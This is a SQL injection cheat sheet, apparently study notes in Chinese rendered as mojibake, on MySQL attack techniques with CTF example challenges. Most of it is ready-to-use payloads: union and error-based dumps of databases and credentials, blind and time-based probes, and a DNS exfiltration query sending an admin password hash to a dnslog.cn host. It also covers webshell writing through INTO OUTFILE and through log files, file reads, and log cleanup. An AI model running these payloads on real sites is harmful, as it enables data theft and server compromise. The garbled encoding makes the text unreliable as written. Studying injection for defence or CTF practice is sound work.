æ‹¼æ¥åçš„sqlè¯­å¥ select * from users where id='1' and 1=1 #' 1'å°†ç¬¬ä¸€ä¸ª'é—­åˆï¼Œ#å°†ç¬¬äºŒä¸ª'æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥è¦è¿›è¡Œæ³¨å…¥ï¼Œåªéœ€è¦å°†and 1=1éƒ¨åˆ†æ›¿æ¢ä¸ºå…¶ä»–sqlè¯­å¥å³å¯ã€‚ å…¶å®åˆ†æsqlmapçš„æ³¨å…¥ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ³¨å…¥è¯­å¥ç”±prefixï¼Œpayloadå’Œsuffixç»„æˆ å›¾æ¥æºhttps://www.freebuf.com/column/161797.html æ¼æ´å±å®³ è·å¾—æ•°æ®åº“ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ‰‹æœºå·ï¼Œèº«ä»½è¯ï¼Œé‚®ç®±ï¼Œå®¶åº­åœ°å€ç­‰ è·å¾—ç½‘ç«™åå°è´¦å· ä¸‡èƒ½å¯†ç ï¼Ÿï¼ˆè¿™å¹´å¤´è¿˜æœ‰å—ğŸ¤”ï¼Œè¿˜æ˜¯æœ‰çš„ã€‚ã€‚ï¼‰ æ‹¿åˆ°å¯†ç ï¼Œé€šå¸¸éœ€è¦é€†å‘è§£å¯†æˆ–è€…å½©è™¹è¡¨ç ´è§£ é€šè¿‡sqlè¯­å¥åˆ›å»ºåå°è´¦å· ä»»æ„è¯»å–æ–‡ä»¶ Getshell ææƒ å¦‚ä½•æŒ–æ˜ ä¸€åˆ‡ä¸æ•°æ®åº“æœ‰äº¤äº’çš„åœ°æ–¹éƒ½å¯èƒ½æ˜¯æ³¨å…¥ç‚¹ï¼Œå–å†³äºåç«¯ä»HTTPè¯·æ±‚æŠ¥æ–‡ä¸­æå–äº†ä»€ä¹ˆæ•°æ®å¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ åˆ¤æ–­é—­åˆç±»å‹ï¼Œé€šå¸¸ä½¿ç”¨æŠ¥é”™ï¼Œå¸ƒå°”ï¼Œå»¶æ—¶ï¼Œæ•°å­¦è¿ç®—ç­‰æ‰‹æ³•æ¥æ£€æµ‹ ' \" \\ +1ï¼Œ-1 æŠ¥é”™å‡½æ•° å»¶æ—¶å‡½æ•° å®æˆ˜ä¸­SQLæ³¨å…¥æœ€å®¹æ˜“å‡ºç°çš„åœ°æ–¹_åªæœ‰é€‰æ‹©æ¡†å’Œæ—¥æœŸæ¡†,ä¼šå‡ºç°sqlæ³¨å…¥æƒ…å†µå—-CSDNåšå®¢ æ¼æ´åˆ©ç”¨ ä¿¡æ¯æ”¶é›† ç«™åº“åˆ†ç¦» Webç«™ç‚¹å’Œæ•°æ®åº“ä¸åœ¨åŒä¸€ä¸ªä¸»æœºä¸Šï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡æ•°æ®åº“å¯¹Webç«™ç‚¹è¿›è¡Œè¯»å†™æ“ä½œ æ”»å‡»æ‰‹æ³• è¯»å–è´¦å¯†ï¼Œè½¬åˆ°webæœåŠ¡å™¨ä¸Šæ‰“ ä¿¡æ¯æ”¶é›†ï¼Œæ•°æ®åº“æœåŠ¡å™¨æ˜¯å¦åœ¨å†…ç½‘ä¸­ ç«™åº“åˆ†ç¦»çš„åˆ¤æ–­æ–¹æ³• é€šç”¨æ–¹æ³• è¯»å–é…ç½®æ–‡ä»¶ï¼Œåˆ¤æ–­IP Mysql select @@hostname; //æœåŠ¡ç«¯ä¸»æœºåç§° select * from information_schema.PROCESSLIST; //å®¢æˆ·ç«¯ä¸»æœºåç§°å’Œç«¯å£ Windowsè¿æ¥æ ¼å¼ï¼šä¸»æœºå:Port Linuxè¿æ¥æ ¼å¼ï¼šIP:Port æœ¬åœ°è¿æ¥æ ¼å¼ï¼šlocalhost:Port select user(); å¦‚æœä¸æ˜¯localhostï¼Œå¤§æ¦‚ç‡æ˜¯ç«™åº“åˆ†ç¦»ã€‚ æ•°æ®åº“ç±»å‹ å„ç§ä¿¡æ¯ # ifnull(@@secure_file_priv,0) secure_file_privä¸ºç©ºæ—¶è¿”å›0,ä¸ä¸ºç©ºæ—¶è¿”å›å…¶å€¼ SELECT concat_ws(0x0a, ifnull(@@secure_file_priv,0), concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment), concat_ws(0xefbc8c, @@hostname, @@port), concat_ws(0xefbc8c, user(), database()), concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir) ) # ç»“æœ 0 10.5.8-MariaDB-3ï¼Œdebian-linux-gnuï¼Œx86_64ï¼ŒDebian buildd-unstable kaliï¼Œ3306 root@localhost /var/lib/mysql/ï¼Œ/usr/lib/mysql/plugin/ï¼Œ/tmpï¼Œ/usr # å¾—åˆ°åç«¯æ‰§è¡Œçš„sqlè¯­å¥ select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE '%673245283%' LIMIT 1),2,3; Mysqlæ”»å‡»æ‰‹æ³• adminç™»å…¥ ä¸‡èƒ½å¯†ç  # åç«¯ä»£ç Demo $query = \"SELECT * FROM manage WHERE user='$user' and passwd='$passwd'\"; if(mysql_query($query)) { echo \"ç™»é™†æˆåŠŸ\"; } é€šè¿‡å¸ƒå°”è¿ç®—è®©whereæ’ä¸ºçœŸ æ³¨å†Œè¦†ç›– admin (æœ‰ä¸ªç©ºæ ¼)æˆ–è€… (æœ‰ä¸ªç©ºæ ¼)admin åŸç†ï¼šç”¨æˆ·åå­—æ®µé•¿åº¦>5ï¼Œæ‰€ä»¥å¯ä»¥æ·»åŠ ç©ºæ ¼ï¼Œè€Œsqlè¯­å¥æ‰§è¡Œæ—¶ä¼šå°†ç©ºæ ¼å¿½ç•¥ã€‚ è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ· [GXYCTF2019]BabySQli # åç«¯ä»£ç Demo $query = \"SELECT * FROM manage WHERE user='$user'\"; $result = mysql_query($query) or die('SQLè¯­å¥æœ‰è¯¯ï¼š'.mysql_error()); $users = mysql_fetch_array($result); if (!mysql_num_rows($result)) { echo \"alert('æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚');history.back();\"; exit; } else{ $passwords=$users['password']; if(md5($password)<>$passwords){ echo \"alert('æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚');history.back();\"; exit; } echo \"ç™»é™†æˆåŠŸ\"; username=admin' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b' limit 1,2--+ passwd=c4ca4238a0b923820dcc509a6f75849b MD5(1)=c4ca4238a0b923820dcc509a6f75849b è”åˆæŸ¥è¯¢æ³¨å…¥ åŸç† sqlè¯­å¥ä¸ºselect,é¡µé¢æœ‰å›æ˜¾æŸ¥è¯¢ç»“æœã€‚ $sql=\"SELECT * FROM users where id=$id \"; $result=mysql_query($sql); $row = mysql_fetch_array($result); echo 'Your Login name:'. $row['username']; echo 'Your Password:' .$row['password']; payload å…ˆåˆ¤æ–­è¡¨ä¸­çš„åˆ—æ•° order by x union select null,null..... è¿™é‡Œä½¿ç”¨nullæ˜¯å› ä¸ºéœ€è¦åŒ¹é…æ•°æ®æ ¼å¼ï¼Œè€Œnullæ˜¯å¯ä»¥åŒ¹é…ä»»æ„æ•°æ®æ ¼å¼çš„ å†åˆ¤æ–­å“ªä¸€åˆ—æ˜¯è¾“å‡ºç‚¹ æ¯ä¸ªä½ç½®è¾“å‡ºä¸åŒçš„å€¼æ¥åˆ¤æ–­ æœ€åè¿›è¡Œæ³¨å…¥ è”åˆæŸ¥è¯¢ï¼Œè·å–åº“å ?id=-1\"union select 1,2,group_concat(schema_name) from information_schema.schemata# è”åˆæŸ¥è¯¢ï¼Œè·å–è¡¨å ?id=-1\"union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='å·²çŸ¥åº“å'# ?id=-1\"union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name='å·²çŸ¥åº“å'# è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå ?id=-1\"union select 1,2,group_concat(column_name) from information_schema.columns where table_name='å·²çŸ¥è¡¨å'# è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå€¼ ?id=-1\"union select 1,2,group_concat(å­—æ®µ1ï¼Œå­—æ®µ2...) from å·²çŸ¥è¡¨å# æ³¨æ„ï¼š å› ä¸ºåç«¯æŸ¥è¯¢è¯­å¥å¯èƒ½åªæ‹¿ç¬¬ä¸€è¡ŒæŸ¥è¯¢ç»“æœå¦‚$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";ï¼Œæ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å¦‚-1ï¼Œä½¿å¾—è”åˆæŸ¥è¯¢çš„ç»“æœæˆä¸ºç¬¬ä¸€è¡Œï¼› è¦æŸ¥çš„è¡¨çš„åç§°(è¿™ä¸ªè¡¨æ˜¯ä¸æ˜¯åœ¨ç°åœ¨ä½¿ç”¨çš„æ•°æ®åº“ä¸­ï¼Œæ²¡æœ‰çš„è¯è¡¨å=æ•°æ®åº“.è¡¨å) å †å æ³¨å…¥ åŸç† åç«¯ä½¿ç”¨çš„æŸ¥è¯¢å‡½æ•°ä¸ºmysqli_multi_query() ï¼Œæ”¯æŒå¤šæ¡è¯­å¥æŸ¥è¯¢ è€Œä¸æ˜¯mysqli_query() ï¼Œä»…æ”¯æŒä¸€æ¡è¯­å¥æŸ¥è¯¢ å±€é™æ€§ å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“çš„å½±å“ æ— å›æ˜¾ï¼šåœ¨ Web ä¸­ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ è§£å†³æ–¹æ³•ï¼šå¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢æŸ¥å‡ºæ¥ payload ?id=1';sqlè¯­å¥;--+ å¯ä»¥ä»»æ„æ‰§è¡Œsqlè¯­å¥ï¼Œå±å®³å¾ˆå¤§ é…åˆhandleç»•è¿‡å…³é”®å­— ã€MySQLã€‘MySQL ä¹‹ handler çš„è¯¦ç»†ä½¿ç”¨åŠè¯´æ˜ handler è¡¨å open ; handler è¡¨å read first; #æ‰“å¼€è¡¨ï¼›è¯»å–ç¬¬ä¸€æ¡æ•°æ® handler è¡¨å read next;#ä¸ä¸Šä¸€æ¡è¯­å¥ä¸€èµ·ç”¨ï¼Œè¯»å–ä¸‹ä¸€æ¡å³ç¬¬äºŒæ¡æ•°æ® é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡ ä½¿ç”¨æ ¼å¼ set @tn = 'hahaha'; //å­˜å‚¨è¡¨å set @sql = concat('select * from ', @tn); //å­˜å‚¨SQLè¯­å¥ prepare query from @sql; //é¢„å®šä¹‰SQLè¯­å¥ execute query; //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥ (DEALLOCATE || DROP) prepare sqla; //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ ä¾‹é¢˜ [SUCTF 2018]MultiSQL set @sql=select '' into outfile '/var/www/html/favicon/shell3.php';prepare name from @sql;execute name; è½¬æ¢è„šæœ¬ a = \"select '' into outfile '/var/www/html/favicon/shell3.php'\" b = [] for i in a: b.append(str(ord(i))) c=','.join(b) res = 'char({})'.format(c) print(res) payload set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query; æŠ¥é”™æ³¨å…¥ åŸç† ä½¿ç”¨mysql_error()å‡½æ•°ï¼Œå¯ä»¥è¿”å›ä¸Šä¸€ä¸ªMysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚ > Access denied for user 'wrong_user'@'localhost' (using password: YES) æŠ¥é”™å‡½æ•° æœ€å¸¸ç”¨çš„ # Xpatè¯­æ³•é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶32ä½,é…åˆsubstr()ç­‰æˆªå–å­—ç¬¦ä¸²å‡½æ•°ä½¿ç”¨ select extractvalue(1,concat(0x7e,(select user()),0x7e)); select updatexml(1,concat(0x7e,(select user()),0x7e),1); å…¶ä»–MySQLæŠ¥é”™æ³¨å…¥ payload åŸå‹ï¼š ?id=1\"or(updatexml(1,concat(0x7e,(),0x7e),1))--+ çˆ†åº“: ?id=1\"or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+ çˆ†è¡¨ï¼š id=1\"or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema='å·²çŸ¥åº“å')),0x7e),1))--+ çˆ†åˆ—åï¼š id=1\"or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name='flag'))),1))--+ çˆ†å­—æ®µå€¼ id=1\"or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+ äºŒæ¬¡æ³¨å…¥--å­˜å‚¨å‹æ³¨å…¥ åŸç† å¸¸è§è½¬ä¹‰å‡½æ•° addslashes() mysql_escape_string() ä»¥sql-labs Less-24ä¸ºä¾‹ åˆ›å»ºç”¨æˆ· $username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; ä½¿ç”¨ä¸æ°å½“çš„å‡½æ•°mysql_escape_stringï¼ŒåŠŸèƒ½ä¸ºåœ¨ MySQL ä¸­å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼ˆå¦‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’Œç©ºå­—èŠ‚ï¼‰å‰æ·»åŠ åæ–œæ å­—ç¬¦ã€‚æ‰€ä»¥è„æ•°æ®è¿˜æ˜¯è¿›å…¥åˆ°äº†æ•°æ®åº“ä¸­ã€‚ ä¿®æ”¹å¯†ç å¤„ $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; ç›´æ¥å°†è„æ•°æ®å–å‡ºå¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œé€ æˆäº†sqlæ³¨å…¥ã€‚ å¸¸è§åœºæ™¯ å°†ä¿å­˜çš„è„æ•°æ®ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œå†æ¬¡è¿›è¡Œsqlæ“ä½œçš„åœºæ™¯ã€‚ ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹è®¢å•ç­‰ä¿®æ”¹å·²ä¿å­˜ä¿¡æ¯çš„åœ°æ–¹ æ³¨å†Œç”¨æˆ·åå¤„ ä¾‹é¢˜ [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk $address = addslashes($_POST[\"address\"]);#å¯æ§å˜é‡ $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";#å°†$_POST[\"address\"]ä¿å­˜åˆ°æ•°æ®åº“ä¸­ $row = $fetch->fetch_assoc();#$rowä¿å­˜sqlè¯­å¥æŸ¥è¯¢ç»“æœ $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];#è°ƒç”¨äº†æŸ¥è¯¢ç»“æœ åˆ†æä¸Šé¢ä¸¤æ¡è¯­å¥ï¼Œå¯¹å¯æ§å‚æ•°addressåªè¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œå°±ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚ å¹¶ä¸”åœ¨updateä¸­å¼•ç”¨äº†$row['address']ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚ å¯ä»¥çœ‹åˆ°åˆ—åä¸ºold_addressï¼Œåœ¨è¿›è¡Œä¿®æ”¹æ—¶ï¼Œä¼šå°†æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹æ—¶ï¼Œåœ¨addresså¤„æ³¨å…¥æ¶æ„ä»£ç ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹æŸ¥è¯¢æ—§åœ°å€æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚ payload 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)# ç›²æ³¨--æ— å›æ˜¾æ³¨å…¥ å¸ƒå°”ç›²æ³¨ é¡µé¢æ— æ•°æ®å›æ˜¾ï¼Œä½†æ˜¯æœ‰ä¸¤ç§è¿”å›çŠ¶æ€ï¼Œpocå¦‚ä¸‹ ?id=1' and 1=1 --+ # True ?id=1' and 1=2 --+ # False payload ?id=1' and 1=å­æŸ¥è¯¢ --+ # å­æŸ¥è¯¢=å­—ç¬¦ä¸²æˆªå–+æ¯”è¾ƒ é€»è¾‘è¿æ¥ç¬¦ payload æˆ– or ï¼Œ\\ \\ å¼‚æˆ– xorï¼Œ^ æŒ‰ä½ä¸/æˆ– &ï¼Œ\\ å­—ç¬¦ä¸²æˆªå– # ä»startä½ç½®å¼€å§‹,æˆªå–lenä¸ªå­—ç¬¦ substr(string,start,len) mid(string,start,len) # ä»å·¦/å³æˆªå–lenä¸ªå­—ç¬¦ left(string,len) right(string,len) æ¯”è¾ƒ like binary 0x25{}{}25 å› ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥è¦ç”¨binary BINARYå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸² è¯­æ³• like æ­£åˆ™ _ . % .* [] [] regexp \"^a\" regexp \"^ab\" æ—¶é—´ç›²æ³¨ æ—¶é—´ç›²æ³¨å°±æ˜¯åœ¨å¸ƒå°”ç›²æ³¨ä¸ŠåŠ äº†å»¶è¿Ÿæ—¶é—´å‡½æ•°sleep(),ç”¨åœ¨Trueå’ŒFalseå›æ˜¾éš¾ä»¥åŒºåˆ†æ—¶,é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­å¸ƒå°”é€»è¾‘çš„æ­£ç¡®ä¸å¦ã€‚ payload if(å¸ƒå°”,A,B)ä¸ä¸‰ç›®è¿ç®—ç¬¦é€»è¾‘ä¸€æ ·,åŠ ä¸Šsleepå‡½æ•° sleep(if(å¸ƒå°”,A,B))å¸ƒå°”æ­£ç¡®,å»¶è¿ŸAç§’,å¸ƒå°”é”™è¯¯,å»¶è¿ŸBç§’ æˆ–è€… if(å¸ƒå°”,1,sleep(x))å¸ƒå°”æ­£ç¡®,æ— å»¶è¿Ÿ,å¸ƒå°”é”™è¯¯,å»¶è¿Ÿxç§’ å…¶ä»–èƒ½é€ æˆå»¶æ—¶æ•ˆæœçš„è¯­å¥ # é€šè¿‡æ‰§è¡Œå¤šæ¬¡å‘½ä»¤å½¢æˆå»¶æ—¶ benchmark(æ‰§è¡Œæ¬¡æ•°,sqlè¯­å¥) # æŸ¥è¯¢ä¸€äº›æ•°æ®é‡æ¯”è¾ƒå¤§çš„è¡¨åšç¬›å¡å°”é›†è¿ç®—ï¼Œå¯¼è‡´æŸ¥è¯¢ç¼“æ…¢ select * from tab1 cross join tab2; select * from tab1,tab2; DNSå¤–å¸¦æ³¨å…¥ åŸç† MySQL Load_File()å‡½æ•°å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œä½¿ç”¨Dnslogæ¥æ”¶è¯·æ±‚ï¼Œè·å–æ•°æ®ï¼› windowsä¸‹å­˜åœ¨UNCè·¯å¾„ UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚ \\\\xxxx\\xx ä½¿ç”¨æ¡ä»¶ windowsç³»ç»Ÿ secure_file_privä¸ºç©º payload union select 1,2,load_file(CONCAT('\\\\\\\\',(SELECT hex(passwd) FROM users WHERE username='admin' LIMIT 1),'.mysql.2fzz61.dnslog.cn\\\\abc')) -- Hexç¼–ç çš„ç›®çš„æ˜¯å‡å°‘å¹²æ‰°ï¼ŒåŸŸåæœ‰ä¸€å®šçš„è§„èŒƒï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½å¸¦å…¥ -- \\\\\\\\è½¬ä¹‰ â†’ \\\\ SMBå¤–å¸¦æ³¨å…¥ http://www.moonslow.com/article/smb_sql_injection å®½å­—èŠ‚æ³¨å…¥ åŸç† å®½å­—èŠ‚ï¼šå¦‚æœä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œè¯¥å­—ç¬¦ç§°ä¸ºå®½å­—èŠ‚å­—ç¬¦ PHPä¸Mysqlä¹‹é—´çš„äº¤äº’ å°†phpçš„sqlè¯­å¥ä»¥character_set_clientç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬ä¸º16è¿›åˆ¶æ•°ï¼‰ï¼Œå†å°†16è¿›åˆ¶æ•°ä»¥character_set_connectionè¿›è¡Œç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬æ¢ä¸ºurlç¼–ç ï¼‰ï¼Œç„¶åä»¥å†…éƒ¨æ“ä½œå­—ç¬¦é›†è¿›è¡Œurlè§£ç ï¼Œæœ€åä»¥character_set_resultsç¼–ç è¾“å‡ºç»“æœã€‚ %df%27 æµè§ˆå™¨urlè‡ªåŠ¨è§£ç ===> Î²' è½¬ä¹‰===>Î²\\'è½¬ä¸º16è¿›åˆ¶===> 0xdf0x5c0x27 è½¬æ¢ä¸ºurlç¼–ç ===> %df%5c%27 è¿›è¡Œurlè§£ç (å› ä¸ºæ˜¯GBKç¼–ç ï¼Œ%dfå’Œ%5cç»“åˆä¸ºæ±‰å­—)===> é‹' ç®€å•çš„è¯´å°±æ˜¯é€šè¿‡å®½å­—èŠ‚åƒæ‰è½¬ä¹‰ç¬¦ï¼Œé€ƒé€¸å‡ºå•å¼•å·æ¥è¿›è¡Œé—­åˆ ä¾‹é¢˜ sql-lab less-32 è½¬ä¹‰å­—ç¬¦ è®¾ç½®ç¼–ç é›† sqlè¯­å¥ï¼Œå•å¼•å·é—­åˆ ?id=1%27 ?id=1%df%27 payload ?id=1%df' ä½¿ç”¨ Linux è‡ªå¸¦çš„ iconv å‘½ä»¤è¿›è¡Œ UTF çš„ç¼–ç è½¬æ¢ echo \\'|iconv -f utf-8 -t utf-16 echo \\'|iconv -f utf-8 -t utf-32 ?id=1ï¿½' order by æ³¨å…¥ https://www.cnblogs.com/1ink/p/15107674.html çŸ¥é“åˆ—åçš„å‰æä¸‹ä½¿ç”¨ ?order=if(è¡¨è¾¾å¼,id,username) ä¸çŸ¥é“åˆ—å ?order=if(è¡¨è¾¾å¼,1,(select id from information_schema.tables)) Getshell å†™æ–‡ä»¶ æ¡ä»¶ é«˜æƒé™ select user, file_priv from mysql.user; çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ secure_fil_priv select @@secure_file_priv; show global variables like '%secure_file_priv%'; # showè¯­å¥è¦å †å æ³¨å…¥å’Œå›æ˜¾ payload åŸºäºè”åˆæŸ¥è¯¢ select *from users where id=1 union select 1,'',3 into outfile 'C:\\info.php'; select *from users where id=1 union select 1,'',3 into dumpfile 'C:\\info2.php'; outfileå’Œdumpfileçš„åŒºåˆ« outfileå¯¼å‡ºæ•°æ®æ”¯æŒå¤šè¡Œï¼Œdumpfileåªæ”¯æŒä¸€è¡Œ outfileä¼šå¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œdumpfileä¸ä¼š æ‰€ä»¥ä½¿ç”¨into dumpfileè¿™ä¸ªå‡½æ•°æ¥å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ éè”åˆæŸ¥è¯¢ select *from users where id=1 into outfile 'C:\\info.php' fields terminated by ''; select *from users where id=1 into outfile 'C:\\info2.php' lines terminated by ''; å†™å…¥æ—¥å¿—æ–‡ä»¶ # --æŸ¥çœ‹é…ç½®ï¼Œæ—¥å¿—æ˜¯å¦å¼€å¯ï¼Œå’Œmysqlé»˜è®¤logåœ°å€(è®°ä¸‹åŸåœ°å€æ–¹ä¾¿æ¢å¤) show variables like '%general%'; set global general_log = on; set global general_log_file = 'e:\\info.php'; # è¿™é‡Œæ—¥å¿—åˆ›å»ºæƒé™è¦ä½ä¸€äº›ï¼Œä¸èƒ½åœ¨cç›˜åˆ›å»º select ''; --ç»“æŸåï¼Œç—•è¿¹æ¸…ç† æ—¥å¿—æ…¢æŸ¥è¯¢ Fromï¼šhttps://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html ä¸ºä»€ä¹ˆè¦ç”¨æ…¢æŸ¥è¯¢å†™å‘¢ï¼Ÿå› ä¸ºå¼€å¯æ—¥å¿—ç›‘æµ‹åæ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œç½‘ç«™è®¿é—®é‡å¤§çš„è¯æˆ‘ä»¬å†™çš„shellä¼šå‡ºé”™ show variables like '%slow_query_log%'; --æŸ¥çœ‹æ…¢æŸ¥è¯¢ä¿¡æ¯ set global slow_query_log=1; --å¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—(é»˜è®¤ç¦ç”¨) set global slow_query_log_file='C:\\\\phpStudy\\\\WWW\\\\shell.php'; --ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„ show global variables like '%long_query_time%'; --æŸ¥çœ‹é»˜è®¤æ—¶é—´å€¼ï¼Œå½“sqlè¯­å¥æ‰§è¡Œæ—¶é—´è¶…è¿‡è¯¥å€¼æ‰ä¼šè¢«è®¡å…¥æ—¥å¿—ä¸­ï¼Œé»˜è®¤10ç§’ select '' or sleep(@@long_query_time+1); --å†™shellåˆ°æ…¢æŸ¥è¯¢æ—¥å¿— sqlmap --os-shell å¤§è‡´æµç¨‹ è·å–ç›®æ ‡ä¿¡æ¯â†’ä½¿ç”¨lines terminated byå°†å…·æœ‰æ–‡ä»¶ä¸Šä¼ çš„ğŸä¸Šä¼ åˆ°ç½‘ç«™â†’é€çº§ç›®å½•è®¿é—®æ‰¾åˆ°ğŸ â†’é€šè¿‡è¯¥ğŸä¸Šä¼ çœŸæ­£çš„å‘½ä»¤ğŸâ†’æµ‹è¯•å‘½ä»¤ğŸèƒ½å¦æ‰§è¡Œâ†’åˆ é™¤ä¸Šä¼ çš„ä¸¤ä¸ªğŸ æ–‡ä»¶ä¸Šä¼ ğŸï¼šformè¡¨å• phpå‘½ä»¤é©¬ï¼šè·å¾—disable_functionï¼Œéå†æ‰€æœ‰ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œåˆ¤æ–­å“ªä¸€ä¸ªä¸åœ¨disable_functionã€‚ è¯»å–æ–‡ä»¶ load_file æ³¨æ„ï¼šè½¬ä¹‰å­—ç¬¦ select load_file('e:\\test.txt'); # \\t é”™è¯¯è·¯å¾„ select load_file('e:\\\\test.txt');# æ­£ç¡® select load_file(0x653A5C746573742E747874);# æ”¯æŒåå…­è¿›åˆ¶ select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# æ”¯æŒcharå‡½æ•° load data create table user(cmd text) load data infile 'e:/test.txt' into table user; select * from user; mysqldump--æ•°æ®åº“å¯¼å‡ºæ—¶çš„RCE shellä¸‹æ‰§è¡Œ mysqldump -uroot -proot --all-databases > file_path # å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“ mysqldump -uroot -proot --databases db1 --tables a1 a2 > /file_path # å¯¼å‡ºdb1ä¸­çš„a1ã€a2è¡¨ å¯¼å‡ºçš„æ–‡æœ¬å†…å®¹ åˆ›å»ºæ•°æ®åº“åˆ¤æ–­è¯­å¥-åˆ é™¤è¡¨-åˆ›å»ºè¡¨-é”è¡¨-ç¦ç”¨ç´¢å¼•-æ’å…¥æ•°æ®-å¯ç”¨ç´¢å¼•-è§£é”è¡¨ ä¾‹é¢˜ CISCN2023åˆèµ›--dumpit å…³é”®ä»£ç  $black = ';`*#^$&|'; #é»‘åå• $db=$_GET['db']; $t2d=$_GET['table_2_dump']; $randstr = md5(time()); $dump='mariadb-dump '.$db.' '.$t2d.' >./log/'.$randstr.'.log'; system($dump); 